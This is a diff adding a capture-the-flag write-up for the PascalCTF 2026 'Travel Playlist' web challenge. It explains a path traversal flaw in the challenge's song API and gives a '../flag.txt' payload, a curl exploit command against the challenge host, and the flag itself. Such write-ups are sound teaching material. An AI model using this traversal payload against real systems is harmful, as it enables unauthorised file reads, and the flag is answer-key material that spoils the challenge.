@@ -1,0 +1,56 @@
+---
+title: 'PascalCTF 2026 - Travel Playlist'
+description: 'Writeup for Travel Playlist from PascalCTF 2026. A Web challenge involving Path Traversal.'
+date: 2026-02-01
+tags: ['writeup', 'web', 'path-traversal', 'pascalctf']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Overview
+
+**Challenge Name:** Travel Playlist
+**Category:** Web
+**Flag:** `pascalCTF{4ll_1_d0_1s_tr4v3ll1nG_4r0und_th3_w0rld}`
+
+## 🔍 Analysis
+
+The challenge presents a music playlist application where users can navigate between pages of songs.
+The frontend uses an API to fetch song details:
+`POST /api/get_json` with body `{"index": <number>}`.
+
+### Vulnerability: Path Traversal
+
+The application likely uses the `index` parameter to construct a file path to read JSON data (e.g., `data/song_<index>.json` or similar). The input was not properly sanitized, allowing for **Directory Traversal**.
+
+The hint provided was a quote from Dante's *Inferno* referencing being lost in a dark forest ("selva oscura") and "the straight path was lost", hinting at path manipulation. It also explicitly stated the flag location: `/app/flag.txt`.
+
+## 🔓 Solution
+
+We can exploit the path traversal vulnerability by providing a relative path to the flag file instead of a song index.
+
+1. **Endpoint**: `https://travel.ctf.pascalctf.it/api/get_json`
+2. **Method**: `POST`
+3. **Payload**: `{"index": "../flag.txt"}`
+
+The server traverses up one directory from the data folder (presumably `/app/songs/` or similar) to `/app/` and reads `flag.txt`.
+
+### Exploit Command
+
+```bash
+curl -s "https://travel.ctf.pascalctf.it/api/get_json" \
+  -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"index": "../flag.txt"}'
+```
+
+**Response:**
+```json
+pascalCTF{4ll_1_d0_1s_tr4v3ll1nG_4r0und_th3_w0rld}
+```
+
+## Flag
+
+```text
+pascalCTF{4ll_1_d0_1s_tr4v3ll1nG_4r0und_th3_w0rld}
+```
